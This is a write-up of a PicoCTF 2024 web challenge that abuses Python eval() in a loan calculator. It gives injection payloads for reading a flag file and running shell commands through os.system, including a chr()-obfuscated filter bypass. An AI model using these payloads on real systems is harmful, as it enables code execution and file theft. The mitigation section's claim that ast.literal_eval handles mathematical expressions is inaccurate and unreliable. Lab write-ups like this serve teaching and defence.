
# 3v@l - PicoCTF 2024

## Challenge Information

- **Category**: Web Exploitation
    
- **Points**: 200
    
- **Author**: Theoneste Byagutangaza
    
- **Description**:
    
    - ABC Bank's website has a loan calculator that uses `eval()` to compute loan amounts.
        
    - The use of `eval()` introduces a critical security vulnerability: **Remote Code Execution (RCE)**.
        
    - Our goal is to exploit this vulnerability and read the flag.
        

---

## Understanding the Vulnerability

The challenge description suggests that the application is using Python’s `eval()` function improperly. The `eval()` function executes arbitrary Python expressions and should never be used with user input because it can allow an attacker to execute arbitrary code.

If the web application directly evaluates user input like this:

```
result = eval(user_input)
```

Then an attacker can input **malicious Python code** to execute system commands, read files, or even compromise the server.

---

## Exploitation Strategy

### 1. **Basic Exploitation Attempt**

Since we want to read the flag, we try:

```
eval("open('/flag.txt').read()")
```

However, some filtering might be in place to block direct access.

### 2. **Obfuscation Techniques**

If direct access is blocked, we can obfuscate the command:

```
open(chr(47) + 'flag' + chr(46) + 'txt').read()
```

This bypasses simple filters that block `'/flag.txt'` directly.

### 3. **Alternative Methods**

If `open()` is restricted, we can try:

```
import os; os.system('cat /flag.txt')
```

or leverage built-in modules:

```
__import__('os').system('cat /flag.txt')
```

---

## Exploit Execution

1. Open the challenge website and locate the input field for loan calculations.
    
2. Inject the payload into the input field:
    
    ```
    open(chr(47) + 'flag' + chr(46) + 'txt').read()
    ```
    
3. Submit the request.
    
4. If successful, the flag will be displayed on the webpage.
    

---

## Mitigation & Prevention

To fix this vulnerability, **never use** `**eval()**` on untrusted user input. Instead:

- Use **safe parsing** methods.
    
- Implement **whitelisting** for allowed operations.
    
- Use `**ast.literal_eval()**` instead of `eval()` for mathematical expressions.
    

```
import ast
def safe_eval(expression):
    return ast.literal_eval(expression)  # Safer alternative
```

---

## Conclusion

This challenge demonstrates the dangers of using `eval()` with user input. By carefully crafting a payload, we were able to execute arbitrary code and retrieve the flag. Always sanitize user input and avoid insecure functions to prevent RCE vulnerabilities.